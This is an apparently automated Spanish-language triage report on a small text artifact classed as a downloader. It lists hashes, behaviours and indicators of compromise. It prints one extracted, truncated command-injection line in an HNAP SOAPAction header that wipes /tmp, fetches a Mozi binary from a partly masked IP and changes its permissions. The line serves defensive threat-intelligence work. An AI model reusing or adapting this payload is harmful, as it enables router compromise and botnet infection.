# 🧬 Payload Analysis

`224b54e3a0f8681d27e023408bad7943b33c55ee587650bffb858a66d7207d4a`

## 📌 Resumen

Artefacto identificado como ASCII text, with very long lines (531), with CRLF line terminators de 795 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `XMLSchema` en `hxxp://www[.]w3[.]org/2001/XMLSchema`. Se extrajeron 5 referencias URL únicas. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:52:40.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `224b54e3a0f8681d27e023408bad7943b33c55ee587650bffb858a66d7207d4a`
- **SHA1:** `c61892511645278ebeda94bb129b417b542119ab`
- **MD5:** `6727a0b6c2f134a230077387545e72eb`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with very long lines (531), with CRLF line terminators |
| Tamaño | 795 B |
| Entropía | 5.41 |
| Strings | 6 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**
3. **Limpieza**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with very long lines (531), with CRLF line terminators; iocs=9

## 🖥️ Comandos observados / extraídos

```text
SOAPAction: hxxp://purenetworks[.]com/HNAP1/`cd /tmp && rm -rf * && wget hxxp://144.48.132.XXX:47044/Mozi.m && chmod 777 /t
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://www[.]w3[.]org/2001/XMLSchema | strings |
| url | hxxp://www[.]w3[.]org/2001/XMLSchema-instance | strings |
| url | hxxp://purenetworks[.]com/HNAP1/ | strings |
| url | hxxp://schemas[.]xmlsoap[.]org/soap/envelope/ | strings |
| url | hxxp://144.48.132.XXX:47044/Mozi.m | strings |
| ip | 190.179.169.XXX | static_analysis |
| ip | 144.48.132.XXX | static_analysis |
| command | SOAPAction: hxxp://purenetworks[.]com/HNAP1/`cd /tmp && rm -rf * && wget hxxp://144.48.132.XXX:47044/Mozi.m && chmod 777 /t | strings |
| hash | 224b54e3a0f8681d27e023408bad7943b33c55ee587650bffb858a66d7207d4a | static_analysis |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
